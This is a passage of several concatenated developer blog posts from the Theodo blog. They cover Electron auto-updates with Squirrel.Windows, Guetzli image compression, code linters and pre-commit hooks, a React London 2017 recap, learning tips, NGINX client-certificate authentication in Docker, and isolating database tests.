    electron.dialog.showMessageBox({""message"": `The release ${releaseName} has been downloaded`});
  });

  // Display an error message on update error
  electron.autoUpdater.addListener(""error"", (error) => {
    electron.dialog.showMessageBox({""message"": ""Auto updater error: "" + error});
  });

  // tell squirrel to check for updates
  electron.autoUpdater.checkForUpdates();
}

app.on('ready', function (){
  // Add this condition to avoid error when running your application locally
  if (process.env.NODE_ENV !== ""dev"") startAutoUpdater(squirrelUrl)
});

Great, now your application will listen to the provided feedUrl. But as it is not wrapped yet into the Squirrel framework, you will have an error thrown when using it in dev mode.
To avoid this inconvenience, use the following command as your npm start in package.json:
NODE_ENV=dev electron .

When launched for the first time, Squirrel will need to restart or it will throw an error.
To handle this, add the following to your Main.js:
const handleSquirrelEvent = () => {
  if (process.argv.length === 1) {
    return false;
  }

  const squirrelEvent = process.argv[1];
  switch (squirrelEvent) {
    case '--squirrel-install':
    case '--squirrel-updated':
    case '--squirrel-uninstall':
      setTimeout(app.quit, 1000);
      return true;

    case '--squirrel-obsolete':
      app.quit();
      return true;
  }
}

if (handleSquirrelEvent()) {
  // squirrel event handled and app will exit in 1000ms, so don't do anything else
  return;
}

This script will read the option of the squirrel event when launching your application, giving you the ability to execute scripts at specific moments of the installation.
In this case, it will restart the application when installing it, updating it or uninstalling it.
You can as well do thing like add an shortcut icon on desktop when installing the application and remove it when uninstalling (check this documentation).
Your app is now ready to be packed 
Let’s release our app!
Okay you have your wonderful app ready to be released!
We now need to package it, using for example the electron-packager.
Install the package :
npm install electron-packager --save-dev

And run this command to package your release :
./node_modules/.bin/electron-packager . MyAwesomeApp --platform=win32 --arch=x64 --out=release/package

Inside release/package/MyAwesomeApp-win32-x64 folder, you now have a MyAwesomeApp.exe file that you can run on Windows! Here is your first release of your wonderful app.
Now wrap it with Squirrel
We will now have to create a Windows installer for it that includes Squirrel.
The Electron team released lately the electron-winstaller package that does the job pretty well.
Install the package with:
npm install electron-winstaller --save-dev

Then create a build.js script like this one:
var electronInstaller = require('electron-winstaller');

resultPromise = electronInstaller.createWindowsInstaller({
    appDirectory: './release/MyAwesomeApp-win32-x64',
    outputDirectory: './release/installer',
    authors: 'Me',
    exe: 'MyAwesomeApp.exe'
  });

resultPromise.then(() => console.log(""It worked!""), (e) => console.log(`No dice: ${e.message}`));

This file will tell Squirrel all it needs to know to create you an installer:

Where your app release is located
Where to put the new release
Where the entrypoint of your app is

Execute this script with node:
node ./build.js

Go and check in release/installer, you now have a ready to use Squirrel server!
It should look like this:
installer
├─ RELEASES
├─ MyAwesomeApp-0.0.1-full.nupkg
└─ Setup.exe

Distribute your application
The only thing you need now is to create a file server to serve this folder on internet. You can for example serve it with php:
php -s localhost:3333

Very simply, you can now distribute your application to your users with the Setup.exe file.
Go to http://localhost:3333/Setup.exe, this will download the Setup.exe file which will install MyAwesomeApp wrapped with Squirrel on your computer.
Run the Setup.exe file, and the application should be installed in C:\Users\Me\AppData\MyAwesomeApp\.
To run it, launch the MyAwesome.exe file.
You can as well create a shortcut on your desktop for later use.
Time to build a new release
Let’s now try to build a new version of our app and to release it!
First things first, let’s create a new feature:
alert('OMG such new feature!!');

Now bump the version from package.json.
This is compulsory if you want to create a new package, otherwise the previous one will be overwritten:
npm version patch

The 0.0.2 version of our app is ready!
Redo the process to build a new package.
To simplify this, we can write npm commands:
""scripts"": {
  ""build:package"": ""electron-packager . MyAwesomeApp --platform=win32 --arch=x64 --out=release/package"",
  ""build:winstaller"": ""node ./build.js"",
  ""build"": ""npm run build:package && npm run build:winstaller""
}

Run then:
npm run build

Check out the releases/installer, a new package appeared!
Your Squirrel server should now looks like this:
installer
├─ RELEASES
├─ MyAwesomeApp-0.0.1-full.nupkg
├─ MyAwesomeApp-0.0.2-diff.nupkg
├─ MyAwesomeApp-0.0.2-full.nupkg
└─ Setup.exe

When the magic happens
Open now your application: you can use the shortcut that you have created earlier or go to C:\Users\Me\AppData\MyAwesomeApp\.
Wait for around 20sec, and your app should reload and you will see your new wonderful feature appears!

What happened?
Let’s give a look at how the Squirrel app has been installed: the location should be C:\Users\Me\AppData\MyAwesomeApp\, where Me is your Windows username.
The application is bundled as follows:
MyAwesomeApp
│
├─ app-0.0.1                // This contains the packaged electron application version 0.0.1
│  ├─ MyAwesomeApp.exe
|  ├─ squirrel.exe
|  ...
│  └─ resources
│     ├─ app.asar           // This contains the source code of electron application version 0.0.1
│     └─ electron.asar
│
├─ packages                 // This contains the packages downloaded from Squirrel server
│  ├─ RELEASES
│  ├─ MyAwesomeApp-0.0.1-full.nupkg  
│  ...
│
├─ MyAwesomeApp.exe            // This will launch Update.exe and then the latest app installed
├─ SquirrelSetup.log
└─ Update.exe               // This is the Squirrel program used to Update application

So what’s happening when you click on the shortcut?

The entry point is /MyAwesomeApp.exe.
This will launch the latest local version of the application (here 0.0.1).
The entry point of the application is main.js.
It contains the startAutoUpdater function we added earlier which configures the squirrel updater through the electron.autoupdater API.
This will call /Update.exe (which is the main Squirrel program) to check for new releases.
Update.exe checks at the feedUrl set and download the remote RELEASES file.
Then, it compares this downloaded file to the local /packages/RELEASES file.
If there is a new version, it downloads it and unpack it into an app-0.0.2 folder.
Then the ‘update-downloaded’ event is triggered and the alert appears in MyAwesomeApp.
When launching again the MyAwesomeApp, the previous version is cleansed and the application is updated.

The easy part
To set up continuous deployment, deploy a new release on your server and Squirrel will do the rest!
You now know pretty everything about the Squirrel.Windows framework!
To dive deeper into the possibilities that it offers, open a terminal on Windows and run ./Update.exe into your project folder to display available documentation.
Hope this helps, don’t hesitate to give feedbacks!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Ngô-Maï
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										This article has been translated in russian here.
As you may already know, the average web page is now heavier than Doom.
One of the reasons for this increase is the weight of images, and the need to support higher resolutions.
Google to the Rescue
Google just published a new JPEG compression algorithm: Guetzli.
The main idea of this algorithm is to focus on keeping the details the human eye is able to recognize easily while skipping details the eye is not able to notice.
I am no specialist, but the intended result is to get an image which percived quality is the same, but with a reduced filesize.
This is not a new image format, but a new way to compress JPEG images
Which means that there is no need for a custom image reader, the images are displayed by anything that already renders JPEGs.
Guetzli in Real Life
On one of my projects, we had an image-heavy homepage (about 30Mb for the homepage alone, 27 of those only for the images).
I decided to give Guetzli a try, to convince our product owner and our designer that the quality loss would be acceptable, I tried this new algorithm on one of the high-res image we were not using (a 8574×5715, 22MB JPEG).
It crashed.
According to google (and my experiences confirms the figures), Guetzli takes about 300MB RAM per 1Mpix of image (so about 15GB for the image I had) and I did not have that memory available at the time (half a dozen node servers, a couple docker containers, chromium and a couple electron instances were taking enough space to get my computer under the requirement).
I retried after cleaning up every non-vital process, Guetzli took 12GB of RAM but succeeded.
Google also states that it take about one minute per MPix for Guetzli to process an image, which is about the time it took me (a bit above 40minutes).
The resulting image weighted under 7MB (from 22MB), and I could not determine by looking at them which was the compressed one (our designer could, but admitted that the difference was “incredibly small”).
6.9M    home-guetzli.jpg
22M home-raw.jpg

That compression was made using Guetzli’s default quality setting (which goes from 84 to 100, to get under 84 you would need to compile and use a version where you change the minimal value).
More Tests and Some Successes
I then decided to try different quality settings for that image (wrote a very simple script to do that without having to relaunch the process every 40 minutes, and to be able to do it during my sleep).
The results are here (and it seems that Guetzli’s default quality factor is 95).
6.9M    ./home-guetzli.jpg
22M ./home-raw.jpg
3.0M    ./home-raw.jpg.guetzli84.jpg
3.4M    ./home-raw.jpg.guetzli87.jpg
4.2M    ./home-raw.jpg.guetzli90.jpg
5.5M    ./home-raw.jpg.guetzli93.jpg
8.8M    ./home-raw.jpg.guetzli96.jpg
18M ./home-raw.jpg.guetzli99.jpg

Both the product owner and the designer agreed to go with the 84 quality factor. I then converted all our assets and we went from 30MB to less than 8MB for the homepage (3MB of those being the CSS/script).
Should be noted that there was not any form of image compression before.
Caveats
The installation of Guetzli on my machine was painless (someone set up an AUR package containing Guetzli on archlinux, thanks a lot to whoever did that), and running it is straightfoward (as long as you have enough RAM).
There seems to be a brew package (for macOs users), but I did not test it.
Guetzli requires a lot of RAM and CPU time for huge images (a lot being relative, i.e. don’t expect to be able to do anything while it’s running).
If RAM is not your bottleneck you might even want to consider to run multiples instances of Guetzli in parallel on different images, as it is (as of this writting) only taking one core.
Being a JPEG encoder, it cannot output PNGs (so no transparency).
But it can convert and compress your PNGs.
It’s efficiency is tied to the initial quality of the picture: I noticed the compression ratio going from 7x on the largest image to 2x on small images.
The quality loss was also more visible on those small images.
On a few cases I also witnessed a loss of color saturation (which was deemed acceptable in my case).
TL;DR
Give Guetzli a try, it might give you unacceptable results (especially with low quality), but it might save you a few MBs on your website.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Clément Hannicq
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Are you tired of always writing the same comments on others pull requests? Are you tired of always reading the same comments on your pull requests? Stop wasting time, here’s the solution.
Step One: Install linters on your project
For your php files
Inspired by this CodeSniffer and PhpStorm Code Inspection article, we can install phpcs with a specific coding standard directly on your project.
Install CodeSniffer
composer require --dev squizlabs/php_codesniffer

Install a coding standard
When I start working on a Symfony2 project, it was with the djoos/Symfony2-coding-standard repository.
composer require --dev escapestudios/symfony2-coding-standard

Now i made my own my fork with more rules, try it!
composer require --dev vincentlanglet/symfony3-custom-coding-standard
Use it
Let’s try with this file
// yourfile.php

<?php

class Entity {
    function getVariable() {
        return $this->variable;
    }

    function setVariable($newValue) {
        $this->variable = $newValue;
    }

    private $variable;
}

The following command
vendor/bin/phpcs --standard=../../../../vincentlanglet/symfony3-custom-coding-standard/Symfony3Custom yourfile.php

will return error messages

that you can easily correct
<?php

namespace AppBundle\Entity;

/**
 * Class Entity
 *
 * @package AppBundle\Entity
 */
class Entity
{
    /**
     * @var string
     */
    private $variable;

    /**
     * @return string
     */
    public function getVariable()
    {
        return $this->variable;
    }

    /**
     * @param string $newValue
     */
    public function setVariable($newValue)
    {
        $this->variable = $newValue;
    }
}

NB: If you are tired to write --standard=../../../../vincentlanglet/symfony3-custom-coding-standard/Symfony3Custom,
or if you need to configure phpcs to use it with PhpStorm, try
vendor/bin/phpcs --config-set default_standard ../../../../vincentlanglet/symfony3-custom-coding-standard/Symfony3Custom

You can find others options here.
For your javascript files
Let’s do the same with eslint.
Install eslint
npm install eslint --save-dev

Generate a configuration file
To start the configuration of eslint, use
./node_modules/.bin/eslint --init

After answering a few questions, it will generate a .eslintrc file configured like this
{
  ""extends"": ""eslint:recommended"",
  ""rules"": {
    ""semi"": [""error"", ""always""],
    ""quotes"": [""error"", ""double""]
  }
}


extends apply all the rules of eslint:recommended to your project. I recommend the airbnb config.
semi and quotes are extra rules. The first value is the error value of the rule.

Use it
Let’s try with this file
// yourfile.js

var object={
  'key': 3,
     ""otherKey"" :2
};

console.log(object)

The following command
./node_modules/.bin/eslint yourfile.js

will return error messages

that you can easily correct
const object = {
  key: 3,
  otherKey: 2,
}

console.log(object)

Even for your css files
In the same way, you can lint your css files thanks to stylelint.
Install stylelint
npm install stylelint --save-dev

Write your configuration file
I recommend the stylelint-config-standard.
npm install stylelint-config-standard --save-dev

Now you have to create your .stylelintrc file, it works like your .eslintrc file:
{
  ""extends"": ""stylelint-config-standard"",
  ""rules"": {
    ""string-quotes"": ""single""
  }
}

Use it
Let’s try with this file
/* yourfile.css */

.header {

}

body {
text-color: red;
margin-top: 10px;
margin-bottom: 10px;
margin: 0;
}

The following command
./node_modules/.bin/stylelint yourfile.css

will return error messages

that you can easily correct
body {
  color: red;
  margin: 10px 0;
}

Step Two: Use linters automatically before each commit
Use pre-commit hooks
Pre-commit hooks were already introduced in this article, but personally I prefer using a npm package.
Install pre-commit
npm install pre-commit --save-dev

Configure pre-commit
You just need to specify scripts you want to launch before committing in your package.json.
You could even launch tests before commits if you wanted.
{
  ""name"": ""Something"",
  ""version"": ""0.0.0"",
  ""description"": ""Something else"",
  ""main"": ""index.js"",
  ""scripts"": {
    ""lint:php"": ""vendor/bin/phpcs --standard=../../../../escapestudios/symfony2-coding-standard/Symfony2 *.php"",
    ""lint:js"": ""eslint *.js"",
    ""lint:css"": ""stylelint *.css""
  },
  ""pre-commit"": [
    ""lint:php"",
    ""lint:js"",
    ""lint:css""
  ]
}

Use it
Just commit!
But don’t worry, you can still force a commit by telling git to skip the pre-commit hooks by simply committing using --no-verify.
Check only modified files to be more user-friendly
Running a lint process on a whole project is slow and linting results can be irrelevant. Ultimately you only want to lint files that will be committed. Lint-staged will be used to run linter on staged files, filtered by a specified glob pattern.
Install lint-staged
npm install lint-staged --save-dev

Configure lint-staged
Launch lint-staged with pre-commit and precise which linter you want to use for specific files pattern in your package.json.
{
  ""name"": ""Something"",
  ""version"": ""0.0.0"",
  ""description"": ""Something else"",
  ""main"": ""index.js"",
  ""scripts"": {
    ""lint-staged"": ""lint-staged""
  },
  ""lint-staged"": {
    ""*.php"": ""vendor/bin/phpcs --standard=../../../../escapestudios/symfony2-coding-standard/Symfony2"",
    ""*.js"": ""eslint"",
    ""*.css"": ""stylelint""
  },
  ""pre-commit"": [
    ""lint-staged""
  ]
}

Use it


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Vincent Langlet
  			
  				Vincent Langlet is an agile web developer at Theodo.  			
  		
    
			

									"
"
										On a breezy day in March, I, along with three other TheodoUK-ers, attended React London 2017. Standing in the stark light of the Westminster sun that silhouetted the brutalist architecture of the QEII Centre, we admired the conference’s production value – check out that flag! But would we actually learn anything, or would it just be a day of beautiful typography and tasty canapés? We silenced these self-indulgent musings and crossed the threshold into the El Dorado of front-end development.
React London 2017 flag, outside the QEII Centre. Photo by me.
prettier
YouTube/project
After a light breakfast, we settled in for the first talk: prettier, a JavaScript pretty printer, by Facebook engineer Christopher Chedeau. prettier takes any JavaScript file and returns it perfectly formatted. You may have come up against the limitations of auto-formatting tools such as beautify or eslint. prettier improves on these because it can fix everything, even maximum line length violations (and their inverse, premature multi-line formatting). This is because it first parses the JavaScript into an abstract syntax tree, removing all existing formatting, and then pretty-prints the result (a technique based on a 1983 paper by Philip Wadler). Adding a pre-commit hook that runs prettier completely eliminates the need for all those annoying reformatting requests in code reviews – so called ‘nits’. Perhaps one day we will upload just abstract syntax trees to GitHub, then when we want to read them, render them to code using prettier with our own preferred syntax settings. Could this, once and for all, end the debate on semi-colons v. no semi-colons?
logux
YouTube/project
Next up was Andrey Sitnik, fresh (or perhaps lightly pickled, as he would be the first to admit) in from St Petersburg. He is the creator of logux, a “new approach to client-server communication”. Inspired by concepts from swarm.js (a “general-purpose isomorphic database that runs simultaneously on the server and client”), logux is essentially the love child of Meteor and Redux. Instead of implementing your own AJAX/REST client-server communications, redux actions are automatically synchronised between the two, thereby keeping their states identical. This eliminates a huge amount of overhead when building apps for the web, meaning more time for vodka …errrr I mean ‘business logic’. Sounds good to me.
Complexity curve with AJAX/the world before logux, from Andrey’s slides.
Reason
YouTube/project
Ladies and gentlemen, hold on to the edge of your seats, we now enter the s t r a n g e world of functional programming.
Reason is a new syntax layer and toolchain for OCaml, a powerful multi-paradigm language derived from ML (functional heaven). Reason is the past (the first version of React was written in SML, aka OCaml’s cousin) and the future, of React. It resembles a typed subset of modern JavaScript, making it easy for frontend developers to jump in and start flexing their functional muscles.
Functional muscles. From T nation.
Reason compiles to both JavaScript and native code – Facebook uses it in production on both the frontend and backend. Cheng Lou, of Facebook, presented a compelling introduction to Reason from first principles. What makes an ideal programming language? What if we can push all the meta language – modules, files, tests, documentation, package management – down into the language itself, to make expressing and reasoning about it much easier? A practical example: Reason introduces the concept of modules. These are named, scoped blocks of code that can contain anything that an OCaml/Reason file can. Files and modules map to each other semantically: a file containing multiple modules is equivalent to a folder of files.

/* school.re */

module Teachers = {...};
module Rooms = {...};
module Students = {
  ...
  module Agendas = {...};
  ...
};


A Reason file, school.re, containing nested modules, equivalent to a filesystem.
Having ‘first class’ files (modules can be nested, and even passed to and returned from functions) means things like code generation, module typing, module encapsulation and module abstraction can be pushed from the meta level back down into the language itself. If a language can reach a level of maturity where all the boilerplate has been absorbed into the syntax, we could theoretically be left to only write application specific code.
A shocked boilerplate. From Boilerplate.
With lunch (delicious noodles by Leith’s) swiftly approaching, we had a series of 10 minute Lightning Talks, on topics from snapshot testing with Jest to offline-first React and ReactNative development. Then, the Feeding began.
Feeding Frenzy. From Feeding Frenzy 2, by PopCap.
styled-components
YouTube/project
Hello. Yes, YOU there. Have you ever styled a React Component using CSS? Ever noticed that you are defining single-use classes, in other words there is a one to one mapping between your CSS classes and components? styled-components enforces better practices by removing that mapping. Instead, you style the components themselves.styled-components uses a vanilla ES6 feature, tagged template literals, to drive its syntax. It solves the lack of proper CSS scoping and promotes better designed ‘style interfaces’ to your components, by encouraging the use of props to change your components’ styles, just as you would do to change their behaviours. This is preferable to manually applying CSS classes (via className), which are actually just implementation detail.
styled-components also introduces themes, a workaround for when you do want to apply CSS globally. The main problem with styled components seems to be the lack of standard naming conventions in themes. A standard would allow instant plug and play with third party components, but has not yet been established – for now, you need to look at the component’s implementation to ensure it correctly observes your theme.
The speaker, Max Stoiber, also took the opportunity to debut Polished.js, a “lightweight toolset for writing styles in JavaScript”. Think underscore.js, but for styles. Rather than being a CSS framework like Bootstrap, Polished.js provides Sass-style utility functions and mixins, making the switch from a CSS pre-processor to styling in JS super easy.
React Fiber
YouTube/project
React is capable of rendering to more environments than just the browser. You have probably heard of ReactNative, but what about ReactVR, ReactBlessed (terminal UIs!) and ReactHardware? A key process in React is reconciliation, the internal ‘diffing’ algorithm that compares one tree with another to determine which parts need rerendering. React’s ability to render to multiple different environments was made possible by reconciliation and rendering being seperate processes. In fact, internally, React comes in two halves – the core and the renderers. Each different environment can supply its own renderer, whilst sharing the same core reconciler. React’s current reconciler is called Stack; its upcoming successor, 2 years in the making, is Fiber.
Stack (left) v Fiber (right) performance comparison – rendering hundreds of components in a Sierpinski triangle. See the live version here.
The primary goal with Fiber is speed – it achieves this by introducing scheduling, the process of determining when work should be performed. Rendering tasks are assigned relative priorities and can then be prioritised, delayed or aborted as required. This gives huge UI performance gains for dynamic UIs and animations. Fiber isn’t ready quite yet, but as it is already promising complete backwards-compatibility, it’s definitely something to look forward to.
Dustan Kasten, the speaker, then did a code walkthrough of a custom renderer he had written using the new Fiber renderer official API.
Watch this amazing talk (recommended by Dustan), or read this overview, for more.
Panel
YouTube
Next we had the React panel discussion with four Facebook engineers: Ben Alpert, Dan Abramov (creator of Redux, CreateReactApp, ReactHotLoader), Lee Byron and Christopher Chedeau. They addressed the two most important questions for every React developer:

Should you put everything in your redux store, or just app state (i.e. not UI state)? Spoiler: do what makes sense for you and your app.
Who would win a fight between Mark Zuckerberg & this panel? They said the Zuck – terrifying.

Let the hacking begin – the Zuck. From Democratic Underground.
Weapons grade React
YouTube
The closing talk, Weapons grade React, was by American brogrammer and CEO of Wheeler Defense Systems (disclaimer: this is not a real company), Kenny Wheeler. Despite difficulties with UK customs, Kenny had imported his ReactHardware-powered, car-mounted robot crossbow, named CrossBro. Controlling it with a ReactNative mobile app, he proceeded to perform target practice on his company’s latest hire (ok, it was a Nerf  crossbow).
A picture says a thousand words, or something. From Kenny Wheeler’s presentation.
React London 2017 was an incredible experience. The maturity of frontend engineering, with amazing technologies emerging all the time, shows what an exciting time it is to be a web developer.
DIY Theodo.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jack Lawrence-Jones
  			
  				  			
  		
    
			

									"
"
										
As a developer, I find exciting and captivating to discover a new technology or to learn a new language. But how to do it effectively? 
Here are few tips you can try when beginning a project on a new technology :

Understand the structure: learning how functionalities and roles are separated and work together will help you to know how to add functionalities and where in your project. If you can highlight the architectural patterns and understand on which one the technology is built, you will really see the structure of it. 
Learn how to write properly what you want to implement. You can  check some previous PR of another project working on the same technology. That way, you will see how to add your own contribution to the structure.
Identify the ninjas: Wether they are part of your company or someone to follow online, identify the experts in the technology you want to master. You will benefit from their knowledge.
Be curious: do not let dark areas you do not know in your project. Try to have a good overview of all your project without going into details. Many technologies have well structured tree project. Even if you don’t use some parts of the project they are here for a reason. Do not hesitate to ask your teammates, they know things !
Find a mentor: if you’re lucky enough to know people more experienced, don’t hesitate to pair-program with them. That way you will understand how they think this technology and how they handle the constraints of it.
Draw the data flow: when you start to have a good idea of how your project is built, try to draw the data flow of what come in and out of your project. By doing so, you will understand how your program reacts to an event or a user input.
Use a debugger: a debugger will allow you to stop your program almost everywhere and to check the state of the data that is being processed. You can run your program instructions by instructions, understanding what truly does your code.
Read unit tests:  unit tests are meant to validate that each step of your software worked as designed. You will see what each part is supposed to have as input and what it is expected to return.
Write automated tests: writing automated tests will help you greatly to understand how the code you write works and also what it needs to be able to work correctly.
Make your code crash: this may seem odd, but when you just finished a new functionality, try to make it endure different inputs. You will see the full potential of what you just wrote, and if it crashes, ask yourself why and try to understand the limits of the mechanisms you used. You will learn about the side effects of the technology and its assets. The best way to do so is to write unit tests, because it allows you to test each part of your code separately.

Here are some articles that helped me discover new technologies on my projects:
Redux (thanks Nicolas Boutin for these amazing articles ;))

You might not need Redux


A cartoon intro to Redux


Sagas in Redux

Symfony

The big picture


Configure Xdebug and PhpStorm for a Vagrant project in 5 minutes

Javascript

Keep calm and love Javascript unit test

 
Feel free to add your own gold nuggets articles 😉

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Charles Parent
  			
  				  			
  		
    
			

									"
"
										You can follow this article with the related Github repository.
Introduction
During a mission I did at Theodo, I worked on a security issue about controlling the access to an application.
It included changing NGINX and Apache configurations.
When the issue was discovered, we tried to fix it directly on the production environment and we failed.
If you’re trying to make a change directly on the production environment, it probably won’t work and will break the application. You need to test it first.
What is my problem?
I want to restrict access to my NGINX server so that the client can’t access the NGINX server directly.

To solve this problem, I want to simulate the Proxy and the NGINX servers. I can either:

Use several servers in a cluster
Use virtual machines locally
Use Docker locally

The cluster solution is very bad because it won’t work locally, and it costs money. The second solution is better but virtual machines are not easy to configure as a local network, and they take a lot of computing ressources, as the whole OS is running.
In contrast, Docker is a convenient tool to run several containers (which take a small computing ressource) and simulate a network of independent servers.
How to setup my containers using docker-compose?
This part requires docker-compose. It is a tool that creates several Docker containers with one command.
Create a docker-compose.yml file containing:
 # docker-compose.yml

version: '2'

services:

  app:
    image: nginx:latest
    container_name: app

  proxy:
    image: httpd:latest
    container_name: proxy
    depends_on:
     - app

The depends_on block means that the app will start before proxy.
How to link the ports between my container and my computer?
Add some ports:
# docker-compose.yml

services:

  app:
    ...
    ports:
      - ""443:443""
    ...

  proxy:
    ...
    ports:
      - ""9443:443""
    ...

It links the ports like this: local-port:container-port
How to watch logs on local files and enable debug?
Link the log files in your volumes:
# docker-compose.yml

services:

  app:
    ...
    volumes:
      - ./nginx/logs:/usr/share/nginx/logs
    ...

  proxy:
    ...
    volumes:
     - ./proxy/apache2/logs:/usr/local/apache2/logs
    ...

It links directories or single files like this:
local/path:container/path
You can now monitor the logs in your editor at proxy/apache2/logs and nginx/logs, or using tail -f.
Set NGINX in debug mode using a custom command:
# docker-compose.yml

services:

  app:
    ...
    command: [nginx-debug, -g, daemon off;]
    ...

This will launch the nginx-debug service instead of the nginx service when you start this container.
How to link the configuration files between my container and my computer?
Add some volumes:
# docker-compose.yml

services:

  app:
    ...
    volumes:
      - ./nginx/nginx:/etc/nginx:ro
      - ./nginx/index.html:/usr/share/nginx/coucou/index.html:ro
    ...

  proxy:
    ...
    volumes:
      - ./proxy/conf/httpd.conf:/usr/local/apache2/conf/httpd.conf:ro
      - ./proxy/apache2/conf/sites-available:/usr/local/apache2/conf/sites-available:ro
    ...

The :ro at the end means read only for the container. In other words, you can only edit this file/directory outside the container.
How to solve my security problem?
The solution to my problem is to enable SSL Client Authentication on the NGINX server, in order to allow only the requests coming from the proxy server:

Using the “fail & retry” process, I found the correct configuration:

Modify the config files in proxy/conf/ and nginx/nginx/.
Launch the containers with docker-compose up.
Test if it works. If needed, look at the log files.
Stop the containers with Ctrl + C and start over.

The important part of the configuration I discovered is the following:
# proxy/apache2/conf/sites-available/appli.conf
...
SSLProxyEngine on
SSLProxyCheckPeerName off
SSLProxyMachineCertificateFile ""/usr/local/apache2/ssl/proxy.pem"" # sends the client certificate
...

# nginx/nginx/conf.d/default.conf

server {
    ...
    # verifies the client certificate

    ssl_verify_client on;
    ssl_client_certificate /var/www/ca.crt; # Trusted CAs

    # verifies the client CN.

    # use $ssl_client_s_dn for nginx < 1.6:
    if ($ssl_client_s_dn_legacy != ""/C=FR/ST=France/L=Paris/O=Theodo/OU=Blog/CN=proxy/emailAddress=samuelb@theodo.fr"") {
        return 403;
    }
    ...
}

You can reproduce it by cloning my repo: Client-SSL-Authentication-With-Docker and running docker-compose up.
If you request directly the NGINX server (https://localhost/), you get a 400 error, but if you request the Proxy server (https://localhost:9443/), you can access the sensitive data.
Conclusion
When repairing this security vulnerability using Docker, I was able to:

give more visibility to my client on how I was handling this network problem, because I had a plan to break the problem.
reassure my client because there was no danger for the production environment.
increase my client’s statisfaction because I solved the problem quickly.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Samuel Briole
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Here is what I learnt while testing backend calls to the database on a project using node.js with Loopback and a PostgreSQL database though this article would apply to any technology.
Basically, it all goes back to saying that each test should have full power over its data. Each test must ensure its independence by cleaning the database first and then defining its own dataset according to its needs.
All tests should start by cleaning the database
When testing a function that reads or writes in the database, it is crucial that you know exactly what data it contains. This means that you should setup the dataset yourself and not rely on any previous data it may contain. This also means you need to clean the database before putting any test data in the database.
In our project, we used to clean the data at the end of each test thinking this was a good way to make our tests independent. However, making the assumption of a clean database is nothing else but making all tests dependent. This is actually a bad practice because a test could break because another test changed.
As a matter of fact, we forgot to clean the database after a few tests. As a consequence, other tests that were executed afterwards were failing randomly depending on the order of execution. We would relaunch all tests until they all passed… Then we moved the cleaning of the database at the beginning of the tests so that each test was responsible for its independence. The result of each test became consistent as they would pass or fail always in the same way across executions.
Yes some tests did fail after that. This highlighted the fact that they were poorly written, which leads me to my second point.
All tests should define their own test data
At the risk of repeating myself, it should be clear what data you have in your database at the beginning of a test. Otherwise, your tests will not be easily maintainable.
In our project, we used to update a common set of data and load it for each test.
We soon faced two problems:

By adding, removing, or updating data, we would break other tests or worse make them useless without breaking. For instance, take a function that filters an array of objects depending on some condition. Your test array has two entries: one that will be kept, one that will be removed. If you remove the entry that should have been removed, the test still passes, but becomes useless.
When updating a function, we had to retro-engineer the dataset to find the new result of the test. Indeed, the common dataset was not made to give us useful data. It contained more useless data than useful data.

When it became impossible to update this common dataset, we decided to define an entire new set of data for each new test. This takes time and requires more lines of code, but eventually made us more efficient. We were able to write more tests in the same amount of time and thus write tests for more cases.
Ids of test data should be hard-coded
You want to make your data as easy to use as possible. Fetching data by id will simplify your tests and make them more readable.
We were not doing this on our project because alls ids were auto-incremented by the database. Consider for instance two persons whose names are ‘Person A’ and ‘Person B’. We want to check that Person A gave 100€ to Person B. If we don’t know the ids for personA, personB, bankAccountA and bankAccountB, here is what the test could look like using Loopback.
// In transfer.test.js
it('should transfer 100 euros', function(done) {
  var accountAId, accountBId;
  cleanDatabase()
  .then(function() {
    return Promise.all([
      Person.create({name: 'Person A'}),
      Person.create({name: 'Person B'})
    ]);
  })
  .then(function(createdPersons) {
    var personAId = createdPersons[0].id;
    var personBId = createdPersons[1].id;
    return Promise.all([
      BankAccount.create({personId: personAId, amount: 100}),
      BankAccount.create({personId: personBId, amount: 0})
    ]);
  })
  .then(function(createdAccounts) {
    accountAId = createdAccounts[0].id;
    accountBId = createdAccounts[1].id;
    return transfer('Person A', 'Person B', 100);
  })
  .then(function() {
    return Promise.all([
      BankAccount.findById(accountAId),
      BankAccount.findById(accountBId)
    ]);
  })
  .then(function(fetchedAccounts) {
    expect(fetchedAccounts[0].amount).toEqual(0);
    expect(fetchedAccounts[1].amount).toEqual(100);
    return done();
  })
  .catch(done);
});

Now, if you hard-code ids, here is what this test might look like:
// In transfer.test.js
it('should transfer 100 euros', function(done) {
  cleanDatabase()
  .then(function() {
    return Promise.all([
      Person.create({id: 1, name: 'Person A'}),
      Person.create({id: 2, name: 'Person B'})
    ]);
  })
  .then(function() {
    return Promise.all([
      BankAccount.create({id: 1, personId: 1, amount: 100}),
      BankAccount.create({id: 2, personId: 2, amount: 0})
    ]);
  })
  .then(function() {
    return transfer('Person A', 'Person B', 100);
  })
  .then(function() {
    return Promise.all([
      BankAccount.findById(1),
      BankAccount.findById(2)
    ]);
  })
  .then(function(fetchedAccounts) {
    expect(fetchedAccounts[0].amount).toEqual(0);
    expect(fetchedAccounts[1].amount).toEqual(100);
    return done();
  })
  .catch(done);
});

What we would love to write is actually this:
// In transfer.test.js
it('should transfer 100 euros', function(done) {
  // Setup data
  var data = {
    Person: [
      {id: 1, name: 'Person A'},
      {id: 2, name: 'Person B'}
    ],
    BankAccount: [
      {id: 1, personId: 1, amount: 100},
      {id: 2, personId: 2, amount: 0}
    ]
  };
  cleanDatabase()
  .then(function() {
    feedDatabase(data);
  })
  .then(function() {
    return transfer('Person A', 'Person B', 100);
  })
  .then(function() {
    return Promise.all([
      BankAccount.findById(1),
      BankAccount.findById(2)
    ]);
  })
  .then(function(fetchedAccounts) {
